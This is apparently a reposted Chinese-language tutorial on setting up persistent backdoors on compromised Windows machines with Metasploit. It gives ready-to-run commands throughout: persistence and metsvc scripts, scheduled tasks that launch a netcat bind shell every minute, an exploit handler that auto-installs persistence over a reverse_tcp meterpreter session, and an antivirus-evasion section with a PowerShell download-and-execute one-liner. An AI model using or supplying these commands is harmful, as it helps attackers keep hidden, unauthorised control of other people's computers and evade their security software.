# AutoMated

http://blog.neargle.com/SecNewsBak/drops/%E7%8E%A9%E8%BD%ACMetasploit%E4%B9%8BAutomated%20Persistent%20Backdoor%20.html

## 1. MSF Persistent Scripts
在介绍之前，首先介绍一下MSF中已经含有的用于创建持续控制后门的脚本。

1.Persistence<br>
路径:`metasploit/scripts/meterpreter/persistence.rb` ，用于创建通过启动项启动。会创建注册表，创建文件， `很容易被杀软拦截` 。
![](img/1.png)

使用举例：
```
run persistence -A -U -i 5 -p 443(端口) -r 192.168.2.101(接收端ip)
```
使用-S可创建服务。-U 会在HKCU添加启动项，-X 会在HKLM添加启动项

2、Metsvc
路径： metasploit/scripts/meterpreter/metsvc.rb ，用于创建服务启动。会创建meterpreter服务，并上传三个文件， 很容易被杀软拦截，且安装服务需要管理员权限 。
![](img/2.png)

使用举例：
```
run metsvc -A
```

## 3、Scheduleme & Schtasksabuse

路径：
```
metasploit/scripts/meterpreter/scheduleme.rb
```
```
metasploit/scripts/meterpreter/schtasksabuse.rb
```

这两个脚本都是通过schtasks来创建计划任务来达到维持权限的目的，区别是` scheduleme 需要当前进程拥有 最高管理权限`(system) ，而 schtasksabuse 则不需要，（` 测试发现很容易被杀软拦截` ）。

### 使用举例：

#### scheduleme

![](img/3.png)

```
run scheduleme -m 1 -e /tmp/nc.exe -o "-e cmd.exe -L -p 8080" #上传nc并创建计划任务每一分钟执行一次 'nc -e cmd.exe -L -p 8080'

run scheduleme -m 1 -c "cmd /c calc.exe" # 创建计划任务每一分钟执行一次打开计算器命令
```

#### schtasksabuse

![](img/4.png)

run schtasksabuse -t 192.168.2.7 -c "cmd /c calc.exe" -d 4  #每隔4秒执行一次calc.exe
使用脚本需要加-t参数

能实现同样功能的脚本还有：
```
exploits/windows/local/s4u_persistence.rb
```


```ps
"SELECT * FROM __InstanceCreationEvent Within 5 " 
  "Where TargetInstance Isa \"Win32_Process\" "
  "And Targetinstance.Name = \"re.exe\" ";
  ```

http://ju.outofmemory.cn/entry/235538

## 2.Autorunscript

说到要自动运行脚本，离不了autorunscript。autorunscript是一个十分强大的脚本，可以让我们在生成会话的同时，执行指定的操作。现在可以直接通过autorunscript来直接调用的脚本已经有66个，目录在 metasploit/scripts/meterpreter 。

举个例子，如果我们想在获取到会话的同时，执行persistence进行留后门操作可以直接这样：

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.2.101(接收端ip地址)
set LPORT 5555
set ExitOnSession false
set AutoRunScript persistence -r 192.168.2.101 -p 5556   (设置和上面不同的端口）-U -X -i 30
exploit -j -z
```

## multi_console_command ：用来执行msf的命令的脚本，帮助信息如下：

![](img/5.png)

使用示例：

```
meterpreter > run multi_console_command -cl "pwd"
```
在cl后面输入相应CMD的代码指令即可执行。

![](img/6.png)

> <h2>cl参数用来执行一条meterpreter的命令，`rc参数用来执行多条meterpreter命令，按行分割。`</h2>

## multicommand ：

用来执行cmd命令的脚本，可以实现执行多条`CMD`的代码。


![](img/7.png)



## 3.绕过拦截

一切脚本你就算写的再好，可是如果绕不过杀毒软件，(常规杀软，卡巴还是太恐怖)。那么可以尝试使用，Powershel在绕杀毒软件上还算过得去。

> 实验过程如下：

1. 首先使用msf的web_delivery获取一个meterpreter的会话。链接到cmd中


2. 构造创建计划。命令如下:
```
schtasks /create /tn mytask /tr notepad.exe /sc hourly  /mo 1
 #指定每1小时执行一次notepad.exe(记事本)，改成你的shell.exe即可
```
> 实测火绒的丢人时刻

3. 可以吧以上命令写成`ps脚本` 上传到网上或者上传到目标电脑的指定目录，然后构造创建计划任务，命令如下：

```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('你的脚本目录');"
```
或者直接
```
powershell.exe -file (文件目录\1.ps1)
```




        